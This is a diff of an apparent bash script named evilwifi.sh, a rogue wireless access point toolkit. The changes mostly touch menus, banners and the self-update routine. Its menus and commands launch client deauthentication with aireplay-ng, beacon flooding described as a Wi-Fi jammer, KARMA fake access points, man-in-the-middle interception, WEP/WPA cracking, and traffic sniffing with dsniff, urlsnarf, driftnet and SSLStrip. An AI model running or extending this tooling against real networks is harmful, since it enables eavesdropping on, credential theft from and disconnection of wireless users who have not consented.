@@ -13,6 +13,12 @@ DHCPE=10.0.255.254         #dhcp end range
 BROADCAST=10.0.255.255     #broadcast address
 # Hosts/Net 65534          #CLASS A, Private Internet
 DHCPL=1h                   #time for dhcp lease
+####################
+AUTO_UPDATES=1             #Auto check for updated script
+TESTING=0                  #test mode does not start anything just writes configs
+SYSLOG_CHECK=0             #Seconds to check syslog is running
+VERBOSE=0                  #
+####################
 #ipcalc_tmp=
 #ADDRESS=$(cat $ipcalc_tmp | grep Address | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
 #NETMASK=$(cat $ipcalc_tmp | grep Netmask | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
@@ -22,20 +28,16 @@ DHCPL=1h                   #time for dhcp lease
 #HOSTMAX=$(cat $ipcalc_tmp | grep HostMax | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
 #BROADCAST=$(cat $ipcalc_tmp | grep Broadcast | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
 function banner(){
-echo "
-######## ##     ## #### ##          ##      ## #### ######## ####
-##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ## 
-##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ## 
-######   ##     ##  ##  ##          ##  ##  ##  ##  ######    ## 
-##        ##   ##   ##  ##          ##  ##  ##  ##  ##        ## 
-##         ## ##    ##  ##          ##  ##  ##  ##  ##        ## 
-########    ###    #### ########     ###  ###  #### ##       ####
-
-+-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
-|B||Y| |H||A||C||K||E||R| |B||U||S||T||E||R||S| |C||A||N||A||D||A|
-+-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
-"
-echo -e " \033[0;31mVersion:\033[0;32m $REVISION\033[0m \033[0;31mRelease: \033[0;32m$release_date\033[0m " 
+clear
+echo -e "
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ PWNAGE EDITION (\033[0;31mVersion:\033[0;32m $release_date\033[0m, \033[0;31mRelease: \033[0;32mr$REVISION\033[0m)
+ -----------------------------------------------------"
 }
 function DATETIME(){
 datestamp=$(date +%F)
@@ -43,6 +45,7 @@ timestamp=$(date +%I-%M-%S-%p)
 printf "$timestamp\n";
 }
 function setupenv(){
+userprompt="root@OpenWRT:/# "
 REVISION=055
 release_date="08/10/2013"
 mydistro="`awk '/DISTRIB_ID/' /etc/lsb-release | cut -d '=' -f2`"
@@ -180,8 +183,9 @@ printf "| [ >> ] ICMP TEST @ "; DATETIME;
 function pinginternet(){
 printf "| [ >> ] WAN ICMP TEST @ "; DATETIME;
 INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
-if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
-WANIP=$(curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+')
+if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE;
+WANIP=$(curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+');
+else INTERNET=FALSE; fi
 if [ "$WANIP" != "" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
 }
 function dnscheck(){
@@ -202,34 +206,35 @@ echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
 ping $VICTIM -c 20 -W 1 | awk '/bytes from/ { print $5 }'
 }
 function checkupdate(){
-echo "+===================================+"
-echo "| RUNNING SCRIPT UPDATE CHECK       |"
-echo "+===================================+"
+echo "| [ >> ] RUNNING SCRIPT UPDATE CHECK                  |"
+echo "+-----------------------------------------------------+"
 newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/VERSION)
 if [ "$newrevision" -gt "$REVISION" ]; then update;
 else
-echo ""
-echo "+===================================+"
-echo "| NO UPDATE IS REQUIRED             |"
-echo "+===================================+";
+echo "| [$OK] NO UPDATE REQUIRED                            |"
+echo "+-----------------------------------------------------+";
 fi
 }
 function update(){
 echo ""
-echo "+===================================+"
-echo "| ATTEMPTING TO DOWNLOAD UPDATE     |"
-echo "+===================================+"
+echo "+-----------------------------------------------------+"
+echo "| ATTEMPTING TO DOWNLOAD UPDATE                       |"
+echo "+-----------------------------------------------------+"
 wget -a $sessionfolder/logs/wget.log -t 3 -T 10 -O /tmp/evilwifi.sh.tmp https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/evilwifi.sh
 if [ -f /tmp/evilwifi.sh.tmp ]; then rm -rf evilwifi.sh; mv /tmp/evilwifi.sh.tmp evilwifi.sh;
-echo "[>] CHMOD 0755 & EXIT"
+echo "| [ >> ] CHMOD 0755 & EXIT"
 chmod 755 evilwifi.sh
-read -e -p "Update [$OK] " enter
+read -e -p "| [$OK] Updated Press Enter To Exit " enter
+echo "+-----------------------------------------------------+"
 exit 0
 else
 echo "Update [$FAIL]..."
 read -e -p "Try Again? " enter
 update
 fi
+}
+function forceupdate(){
+update
 }
 ######################
 # DEPENDENCY SECTION #
@@ -342,9 +347,11 @@ if [ "$BRLAN" = "up" ]; then brlandown; fi
 pspids;
 echo "Stopping Conflicting Services...";
 service lighttpd stop &>>$LOG;
-service apache2 stop &>>$LOG;
+# service apache2 stop &>>$LOG;
 service dhcp3-server stop &>>$LOG;
-# service network-manager stop &>>$LOG;
+service avahi-daemon stop &>>$LOG;
+service network-manager stop &>>$LOG;
+# service networking stop &>>$LOG;
 echo "DONE"
 while [ -s $sessionfolder/pids/airbase-ng.pid ]; do
 sleep 2;
@@ -392,12 +399,12 @@ rm -rf $lockfile
 ###################
 function settings(){
 echo ""
-echo "+===================================+"
-echo "| Listing Network Devices           |"
-echo "+===================================+"
+echo "+-----------------------------------------------------+"
+echo "| Listing Network Devices                             |"
+echo "+-----------------------------------------------------+"
 # airmon-ng | awk '/phy/ {print $1}'
 ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'
-echo "+===================================+"
+echo "+-----------------------------------------------------+"
 echo ""
 echo "Pressing Enter Uses Default Settings"
 echo ""
@@ -1007,10 +1014,11 @@ STARTTERM
 # INTERFACE PREP SECTION #
 ##########################
 function brlan(){
-ifconfig $TAPIFACE 0.0.0.0 up
 brctl addbr $BRLANIFACE
+ifconfig $TAPIFACE 0.0.0.0 promisc
 echo "* ATTEMPTING TO BRIDGE ON $TAPIFACE (br-lan) *"
 brctl addif $BRLANIFACE $TAPIFACE
+
 ifconfig $BRLANIFACE $TAPIP netmask $NETMASK up;
 route add -net $TAPIPBLOCK netmask $NETMASK gw $TAPIP;
 BRLAN=up
@@ -1068,16 +1076,16 @@ sleep 9999; fi
 # SHELL SCRIPT MENUS #
 ######################
 function internetmenu(){
-echo "+===================================+"
-echo "| Internet Detected :-)             |"
-echo "+===================================+"
-echo "| 1) Install Missing Depends         "
-echo "| 2) Update Depends                  "
-echo "| 3) Force Update Script             "
-echo "| 4) Run Script                      "
-echo "+===================================+"
+echo "+-----------------------------------------------------+"
+echo "| Internet Detected :-)                               |"
+echo "+-----------------------------------------------------+"
+echo "| 1) Install Any Missing Depends                       "
+echo "| 2) Check For Updated Depends                         "
+echo "| 3) Force Update This Script                          "
+echo "| 4) Run The Damn Script Already                       "
+echo "+-----------------------------------------------------+"
 echo ""
-read -e -p "Option: " internetmenu
+read -e -p "$userprompt" internetmenu
 echo ""
 if [ "$internetmenu" = "" ]; then clear; internetmenu; fi
 }
@@ -1085,55 +1093,56 @@ function runscript(){
 echo "Running Script...."
 }
 function poisonmenu(){
-echo "+===================================+"
-echo "| Choose You're Poison?             |"
-echo "+===================================+"
-echo "| 1) Attack Mode | *DEFAULT*         "
-echo "| 2) Internet Mode | Man In Middle   "
-echo "| 3) WEP/WPA Hack | AutoPwn          "
-echo "| 4) Beacon Flood | Fake AP Flood    "
-echo "| 5) Deauth Mode | Boot People Off   "
-echo "| ********************************** "
-echo "|     CTRL + C QUITS AT ANYTIME      "
-echo "+===================================+"
+banner
+echo "+-----------------------------------------------------+"
+echo "| Choose You're Poison?                               |"
+echo "+-----------------------------------------------------+"
+echo "| 1) Attack Mode | *DEFAULT*                           "
+echo "| 2) Internet Mode | Man In The Middle                 "
+echo "| 3) WEP/WPA/WPA2 Hack | Tons Of Cracking Utils        "
+echo "| 4) Beacon Flood | Fake Access Point Flood            "
+echo "| 5) Deauth Mode | Boot People Off                     "
+echo "| **************************************************** "
+echo "|     PRESS (CTRL + C) TO QUIT AT ANYTIME              "
+echo "+-----------------------------------------------------+"
 echo ""
-read -e -p "Option: " mode
+read -e -p "$userprompt" mode
 echo ""
 if [ "$mode" = "" ]; then clear; poisonmenu; fi
 }
 function softapmenu(){
-echo "+===================================+"
-echo "| Which AP Software?                |"
-echo "+===================================+"
-echo "| 1) HOSTAPD wITH KARMA              "
-echo "| 2) HOSTAPD NO KARMA                "
-echo "| 3) Airbase-NG WITH KARMA           "
-echo "| 4) Airbase-NG NO KARMA             "
-echo "+===================================+"
+banner
+echo "+-----------------------------------------------------+"
+echo "| Which AP Software?                                  |"
+echo "+-----------------------------------------------------+"
+echo "| 1) HOSTAPD wITH KARMA                                "
+echo "| 2) HOSTAPD NO KARMA                                  "
+echo "| 3) Airbase-NG WITH KARMA                             "
+echo "| 4) Airbase-NG NO KARMA                               "
+echo "+-----------------------------------------------------+"
 echo ""
-read -e -p "Option: " softap
+read -e -p "$userprompt" softap
 echo ""
 if [ "$softap" = "" ]; then clear; softapmenu; fi
 }
 function dhcpmenu(){
-echo "+===================================+"
-echo "| DHCP SERVER MENU                  |"
-echo "+===================================+"
-echo "| 1) DNSMASQ"
-echo "| 2) DHCPD3-SERVER"
-echo "| 3) UDHCPD"
-echo "| 4) MitM No DHCP Server Use This"
-echo "+===================================+"
+banner
+echo "+-----------------------------------------------------+"
+echo "| Which DHCP SERVER?                                  |"
+echo "+-----------------------------------------------------+"
+echo "| 1) DNSMASQ | Does Both DHCP And DNS                  "
+echo "| 2) DHCPD3-SERVER | Debian Distros                    "
+echo "| 3) UDHCPD | Busybox Lightweight Server               "
+echo "| 4) NONE | Use For MITM Or Custom Server              "
+echo "+-----------------------------------------------------+"
 echo ""
-read -e -p "Option: " DHCPSERVER
+read -e -p "$userprompt" DHCPSERVER
 echo ""
 if [ "$DHCPSERVER" = "" ]; then clear; dhcpmenu; fi
 }
 function attackmenu(){
-clear
-echo "+===================================+"
-echo "| MAIN ATTACK MENU                  |"
-echo "+===================================+"
+banner
+echo "+-----------------------------------------------------+"
 echo "| 1) Deauth"
 echo "| 2) Wireshark"
 echo "| 3) DSniff"
@@ -1141,11 +1150,12 @@ echo "| 4) URLSnarf"
 echo "| 5) Driftnet"
 echo "| 6) SSLStrip"
 echo "| 7) Beacon Flood (WIFI JAMMER)"
-echo "| 8) Exit and leave everything running"
-echo "| 9) Exit and cleanup"
-echo "+===================================+"
+echo "| 8) Restart Firewall"
+echo "| 9) Exit and leave everything running"
+echo "| 10) Exit and cleanup"
+echo "+-----------------------------------------------------+"
 echo ""
-read -e -p "Option: " attack
+read -e -p "$userprompt" attack
 if [ "$attack" = "" ]; then clear; attackmenu; fi
 }
 ###################
@@ -1171,7 +1181,7 @@ echo "| 2) AIREPLAY-NG | Aircrack-NG Suite "
 echo "| 3) AIRODROP-NG | Aircrack-NG Suite "
 echo "+===================================+"
 echo ""
-read -e -p "Option: " DEAUTHPROG
+read -e -p "$userprompt" DEAUTHPROG
 if [ "$DEAUTHPROG" = "1" ]; then
 DEAUTHPROG=mdk3
 STARTTERM
@@ -1203,7 +1213,7 @@ echo "| 2) APMAC | MAC ADDRESS OF AP       "
 echo "| 3) CLIEN | ATTACK CLIENT           "
 echo "+===================================+"
 echo ""
-read -e -p "Option: " DEAUTHMODE
+read -e -p "$userprompt" DEAUTHMODE
 if [ "$DEAUTHMODE" = "1" ]; then
 $TERM -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"; fi
 if [ "$DEAUTHMODE" = "2" ]; then
@@ -1499,12 +1509,20 @@ done
 # --------------------------- #
 setupenv
 banner
-echo   "+===================================+"
+echo "  * 1/4 oz Vodka      Pour all ingredients into mixing"
+echo "  * 1/4 oz Gin        tin with ice, strain into glass."
+echo "  * 1/4 oz Amaretto"
+echo "  * 1/4 oz Triple sec"
+echo "  * 1/4 oz Peach schnapps"
+echo "  * 1/4 oz Sour mix"
+echo "  * 1 splash Cranberry juice"
+echo " -----------------------------------------------------"
+echo ""
 sleep 5
+echo "+-----------------------------------------------------+"
 # debugenv
 pinginternet
 depends
-echo   "+===================================+"
 apachesetup
 # apachecheck
 if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then checkupdate; fi
@@ -1515,7 +1533,6 @@ if [ "$internetmenu" = "3" ]; then forceupdate; fi
 if [ "$internetmenu" = "4" ]; then runscript; fi
 stopshit
 # responder
-echo ""
 poisonmenu
 if [ "$LOADCONF" = "0" ]; then softapmenu; fi
 if [ "$LOADCONF" = "0" ]; then dhcpmenu; fi
@@ -1542,7 +1559,7 @@ if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
 if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
 if [ "$mode" = "1" ]; then
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
-echo "nameserver $TAPIP" >> /etc/resolv.conf
+# echo "nameserver $TAPIP" >> /etc/resolv.conf
 fi
 if [ "$mode" = "2" ]; then
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
